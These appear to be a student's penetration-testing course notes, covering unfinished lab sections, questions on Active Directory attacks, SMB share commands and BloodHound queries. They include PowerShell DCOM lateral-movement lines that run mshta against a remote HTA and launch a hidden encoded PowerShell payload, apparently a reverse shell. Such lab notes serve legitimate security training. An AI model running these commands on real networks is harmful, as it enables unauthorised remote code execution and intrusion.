# Incomplete Sections

| Chapter                | Section | Lab Exercise |
| ---------------------- | ------- | ------------ |
| SQL Injection          | 10.3.2  | 4, 6, 7      |
| Client Side Attacks    | 11.2.3  | 2            |
| Client Side Attacks    | 11.3.1  | 1, 3         |
| AD Enumeration         | 21.4.2  | Capstone     |
| Attacking AD Auth      | 22.2.4  | 1            |
| Lateral Movement in AD | 23.1.1  | 2            |
| Lateral Movement in AD | 23.1.2  | 2            |
| Lateral Movement in AD | 23.1.3  |              |

---

# Queries
1. **Section - 21.3.3** - How are SPNs useful while attacking?
2. Not able to run CrackMapExec due to lack of a VENV in python.
3. If i’m logged in as dave. Then if I find that stephanie also has a session on the same machine, what does that mean? What can i do? This can be done with `.\PSLoggedon.exe //files04` command.

```PowerShell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.XXX.72"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c mshta.exe http://192.168.XXX.XXX/shell.hta","7")
```

```PowerShell
LINE1 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.XXX.72"))
LINE2 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c mshta.exe http://192.168.119.147/shell.hta","7")

LINE1 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.XXX.73")) LINE2 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A....","7")
```


[Ligolo-Ng - References](https://discord.com/channels/780824470113615893/1087927333731713094/1194045054671659018)
[CME Help](https://medium.com/r3d-buck3t/crackmapexec-in-action-enumerating-windows-networks-part-2-c61dfb7cd88e)

```text
net use \\computername\sharename
net view \\computername\sharename
dir \\computername\sharename
copy \\computername\sharename\file.txt file.txt
type \\computername\sharename\file.txt 
```

4. If we get a reverse shell, and it is running WSL, it would seem that we have ented a Linux System, however, in reality it would be a Windows System. Do commands like `uname -all` or `whoami` give you better clarification on wether or not it is a Winows System in reality?

---

# Command Dump Windows

```bash
impacket-smbserver share_name ./path/to/share -smb2support -user 'usr' -password 'pswd'
net use m: \\$KALI_IP\share_name # m: is just a random drive letter.
```

# Bloodhound Custom Queries
1. Get a list of all computers on the domain > `MATCH (m:Computer) RETURN m`
2. Get all users in the domain > `MATCH (m:User) RETURN m34`
3. Get all active sessions > `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`

